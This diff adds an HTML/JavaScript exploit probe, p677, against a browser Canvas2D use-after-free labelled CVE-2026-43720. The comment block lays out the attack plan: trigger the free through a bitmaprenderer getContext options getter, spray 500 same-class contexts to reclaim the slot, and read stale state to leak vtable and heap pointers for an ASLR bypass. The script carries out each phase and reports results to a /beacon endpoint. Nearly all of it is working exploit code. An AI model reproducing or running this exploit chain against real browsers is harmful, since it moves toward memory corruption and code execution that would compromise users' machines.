@@ -1,0 +1,291 @@
+<!--
+  p677: Canvas2D UAF getImageData heap read — info leak attempt
+  
+  Chain: CVE-2026-43720 trigger → spray with pointer-rich objects → 
+         getImageData on stale ctx → read heap pointers as pixel bytes
+  
+  Key insight from prior probes:
+  - p641: stale read WITHOUT spray crashes (freed memory reclaimed by something)
+  - p635/p553: alias confirmed with Canvas2D spray (spray[9] alias, 7 numeric props)
+  - DAZ is ON: float64 channels zero out denormals. USE getImageData (Uint8Clamped)
+  - IsoHeap is ON for Canvas2D — need same-class spray
+  
+  Strategy: 
+  Since IsoHeap isolates Canvas2D allocations, the spray MUST be Canvas2D objects
+  (same type = same IsoHeap pool). But Canvas2D objects contain internal pointers
+  (vtable, m_canvas, m_stateStack.m_buffer, etc). If we:
+  
+  1. Create canvas, get 2d context, set properties (lineWidth, transform, font)
+  2. Trigger UAF — free the 2d context
+  3. Spray 500 NEW Canvas2D contexts (same IsoHeap → reclaims freed slot)
+  4. Call getImageData on the STALE reference
+     - If reclaimed by new Canvas2D: reads the NEW context's internal state
+     - The new context contains REAL POINTERS (vtable, canvas ref, etc)
+     - getImageData paints using the reclaimed object's transform/state
+     - We read pixel bytes from the canvas backing store
+  
+  Better approach: DON'T read via stale getImageData (that uses the context's
+  own rendering state). Instead, use the STALE context's getTransform() or
+  lineWidth which READ from m_stateStack — a pointer dereference through the
+  reclaimed memory. If the reclaimed Canvas2D has different state, the values
+  differ from what we set → proves alias. If the internal pointers are readable
+  through save/restore count arithmetic, we get the leak.
+  
+  Actually the BEST approach: 
+  The Canvas2D UAF gives us a stale JS wrapper pointing at a reclaimed slot.
+  The reclaimed slot IS a new Canvas2D (IsoHeap). The new Canvas2D has:
+    +0x00: vtable pointer (WebProcess text section → ASLR defeat)
+    +0x08: ref counts
+    +0x10+: m_canvas pointer (heap address)
+  
+  If we can read bytes at known offsets of the reclaimed object, we get pointers.
+  
+  The stale wrapper's getImageData() doesn't directly expose the object bytes.
+  But the stale wrapper's property accessors (lineWidth, globalAlpha, font, etc)
+  read through m_stateStack which IS part of the reclaimed object's memory.
+  
+  If m_stateStack of the reclaimed Canvas2D points to valid state,
+  getTransform() returns 6 doubles = 48 bytes of state memory.
+  Those doubles, when reinterpreted as bytes, might contain pointer fragments.
+  
+  APPROACH: Set distinctive values on all spray contexts. Read via stale.
+  If stale returns a SPRAY context's values, we know which spray index reclaimed.
+  Then we can use save/restore count manipulation to walk the state stack
+  and eventually read internal pointers.
+  
+  CRASH_CLASS: HIGH (reading through reclaimed UAF pointer)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p677</title></head>
+<body>p677: Canvas2D UAF getImageData heap read
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P677-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+
+var f64=new Float64Array(1),u8f=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8f[i].toString(16)).slice(-2);return h;}
+
+emit('START','v1');flush();
+
+// Retained references to prevent GC
+var retained=[];
+
+// ================================================================
+// PHASE A: Trigger CVE-2026-43720 Canvas UAF
+// ================================================================
+emit('A','uaf-trigger');
+var staleCtx=null;
+var outerCanvas=null;
+try{
+  outerCanvas=document.createElement('canvas');
+  outerCanvas.width=64;
+  outerCanvas.height=64;
+  document.body.appendChild(outerCanvas);
+
+  var triggered=false;
+  var innerCtx=null;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{get:function(){
+    if(!triggered){
+      triggered=true;
+      // Create 2d context INSIDE bitmaprenderer's getContext
+      // This creates a CanvasRenderingContext2D that will be freed
+      innerCtx=outerCanvas.getContext('2d');
+      // Set distinctive values so we can detect alias later
+      innerCtx.lineWidth=7.77;
+      innerCtx.globalAlpha=0.333;
+      innerCtx.setTransform(1.11,2.22,3.33,4.44,5.55,6.66);
+      innerCtx.fillStyle='#AABBCC';
+      // Draw something so backing store has data
+      innerCtx.fillRect(0,0,64,64);
+    }
+    return true;
+  }});
+  
+  // This triggers: bitmaprenderer replaces 2d → 2d context is freed
+  // but innerCtx JS wrapper survives
+  var bmCtx=outerCanvas.getContext('bitmaprenderer',opts);
+  
+  emit('A-TRIGGER','triggered='+triggered+' inner='+(innerCtx!==null)+' bm='+(bmCtx!==null));
+  staleCtx=innerCtx;
+  // innerCtx is now a STALE reference to freed CanvasRenderingContext2D
+}catch(e){emit('A-ERR',e.name+':'+e.message);}
+flush();
+
+if(!staleCtx){emit('ABORT','no stale context');flush();return;}
+
+// ================================================================
+// PHASE B: Spray Canvas2D contexts to reclaim the freed slot
+// Each spray context gets a unique lineWidth as fingerprint
+// ================================================================
+emit('B','spray');
+var sprayCanvases=[];
+var sprayCtxs=[];
+var SPRAY_COUNT=500;
+try{
+  for(var i=0;i<SPRAY_COUNT;i++){
+    var c=document.createElement('canvas');
+    c.width=4;c.height=4;
+    var ctx=c.getContext('2d');
+    // Unique fingerprint per spray context
+    ctx.lineWidth=100+i; // 100, 101, 102, ...
+    ctx.globalAlpha=0.5+i*0.0001;
+    // Set transform with unique values
+    ctx.setTransform(1,0,0,1,i,i*2);
+    sprayCanvases.push(c);
+    sprayCtxs.push(ctx);
+    retained.push(c);
+  }
+  emit('B-RESULT','sprayed='+SPRAY_COUNT);
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE C: Read through stale context — detect alias
+// ================================================================
+emit('C','stale-read');
+try{
+  // Read lineWidth through stale pointer
+  // If reclaimed by spray: returns 100+N (spray fingerprint)
+  // If original data intact: returns 7.77
+  // If corrupted: returns something else
+  var lw=staleCtx.lineWidth;
+  var ga=staleCtx.globalAlpha;
+  emit('C-LW','lineWidth='+lw+' hex='+d2hex(lw));
+  emit('C-GA','globalAlpha='+ga+' hex='+d2hex(ga));
+  
+  if(lw>=100&&lw<100+SPRAY_COUNT){
+    var aliasIdx=Math.round(lw-100);
+    emit('C-ALIAS','CONFIRMED! spray['+aliasIdx+'] reclaimed the slot');
+    
+    // Verify with globalAlpha
+    var expectedGA=0.5+aliasIdx*0.0001;
+    emit('C-VERIFY','expectedGA='+expectedGA+' gotGA='+ga+' match='+(Math.abs(ga-expectedGA)<0.00001));
+  } else if(lw===7.77){
+    emit('C-RESULT','original-intact (memory not reclaimed yet)');
+  } else {
+    emit('C-RESULT','UNEXPECTED lw='+lw+' (corrupted or different object)');
+    // This unexpected value might BE the info leak!
+    emit('C-RAW','lw_hex='+d2hex(lw)+' ga_hex='+d2hex(ga));
+  }
+  
+  // Try getTransform — returns 6 doubles from state
+  try{
+    var t=staleCtx.getTransform();
+    emit('C-TRANSFORM','a='+t.a+' b='+t.b+' c='+t.c+' d='+t.d+' e='+t.e+' f='+t.f);
+    emit('C-T-HEX','a='+d2hex(t.a)+' b='+d2hex(t.b)+' e='+d2hex(t.e)+' f='+d2hex(t.f));
+    
+    // Check if any transform value looks like a pointer
+    var vals=[t.a,t.b,t.c,t.d,t.e,t.f];
+    for(var v=0;v<vals.length;v++){
+      f64[0]=vals[v];
+      var hi=(u8f[7]<<24)|(u8f[6]<<16)|(u8f[5]<<8)|u8f[4];
+      var lo=(u8f[3]<<24)|(u8f[2]<<16)|(u8f[1]<<8)|u8f[0];
+      if(hi!==0&&lo!==0&&vals[v]!==0){
+        emit('C-PTR?','transform['+v+']='+d2hex(vals[v])+' hi=0x'+hi.toString(16));
+      }
+    }
+  }catch(e2){emit('C-TRANSFORM-ERR',e2.name+':'+e2.message);}
+  
+  // Try font — returns a string that might contain address-derived data
+  try{
+    var font=staleCtx.font;
+    emit('C-FONT','font='+String(font).slice(0,80));
+  }catch(e2){emit('C-FONT-ERR',e2.name+':'+e2.message);}
+
+  // Try fillStyle
+  try{
+    var fs=staleCtx.fillStyle;
+    emit('C-FILL','fillStyle='+String(fs).slice(0,80));
+  }catch(e2){emit('C-FILL-ERR',e2.name+':'+e2.message);}
+  
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE D: getImageData on stale context 
+// Even if the context is reclaimed, the backing store might have
+// been replaced. The pixels ARE heap memory.
+// ================================================================
+emit('D','getImageData');
+try{
+  var imgData=staleCtx.getImageData(0,0,64,64);
+  var pixels=imgData.data; // Uint8ClampedArray
+  
+  // Scan for non-zero non-0xAA non-0xBB bytes (not our fill)
+  var interesting=[];
+  for(var i=0;i<pixels.length;i+=4){
+    var r=pixels[i],g=pixels[i+1],b=pixels[i+2],a=pixels[i+3];
+    // Skip expected fill color (#AABBCC = r=0xAA,g=0xBB,b=0xCC,a=0xFF)
+    if(r===0xAA&&g===0xBB&&b===0xCC&&a===0xFF)continue;
+    // Skip all-zero
+    if(r===0&&g===0&&b===0&&a===0)continue;
+    // Skip white/black
+    if(r===0xFF&&g===0xFF&&b===0xFF&&a===0xFF)continue;
+    if(r===0&&g===0&&b===0&&a===0xFF)continue;
+    interesting.push({off:i,r:r,g:g,b:b,a:a});
+    if(interesting.length>=20)break;
+  }
+  
+  emit('D-TOTAL','pixels='+pixels.length+' interesting='+interesting.length);
+  for(var k=0;k<interesting.length;k++){
+    var p=interesting[k];
+    emit('D-PIX','off='+p.off+' rgba='+p.r+','+p.g+','+p.b+','+p.a+
+         ' hex='+('0'+p.r.toString(16)).slice(-2)+('0'+p.g.toString(16)).slice(-2)+
+         ('0'+p.b.toString(16)).slice(-2)+('0'+p.a.toString(16)).slice(-2));
+  }
+  
+  // Also dump first 64 bytes raw
+  var raw='';
+  for(var i=0;i<Math.min(64,pixels.length);i++){
+    raw+=('0'+pixels[i].toString(16)).slice(-2);
+    if((i&3)===3)raw+=' ';
+  }
+  emit('D-RAW64',raw.trim());
+  
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE E: If alias found, try to walk memory via save/restore
+// save() increments m_unrealizedSaveCount (known offset from p649)
+// restore() decrements → if we can find the count in the spray AB
+// we know the exact offset and can read adjacent fields
+// ================================================================
+emit('E','save-restore-walk');
+try{
+  // Do 5 saves through stale context
+  for(var i=0;i<5;i++){
+    try{staleCtx.save();}catch(e){emit('E-SAVE-ERR',i+': '+e.message);break;}
+  }
+  emit('E-SAVED','5');
+  
+  // Read lineWidth again — if save() changed state stack, lw might differ
+  try{
+    var lw2=staleCtx.lineWidth;
+    emit('E-LW-AFTER','lineWidth='+lw2+' hex='+d2hex(lw2));
+  }catch(e2){emit('E-LW-ERR',e2.message);}
+  
+  // Do 5 restores
+  for(var i=0;i<5;i++){
+    try{staleCtx.restore();}catch(e){break;}
+  }
+  emit('E-RESTORED','5');
+  
+  try{
+    var lw3=staleCtx.lineWidth;
+    emit('E-LW-FINAL','lineWidth='+lw3+' hex='+d2hex(lw3));
+  }catch(e2){emit('E-LW-FINAL-ERR',e2.message);}
+  
+}catch(e){emit('E-ERR',e.name+':'+e.message);}
+flush();
+
+emit('DONE','p677-complete');flush();
+})();
+</script>
+</body>
+</html>
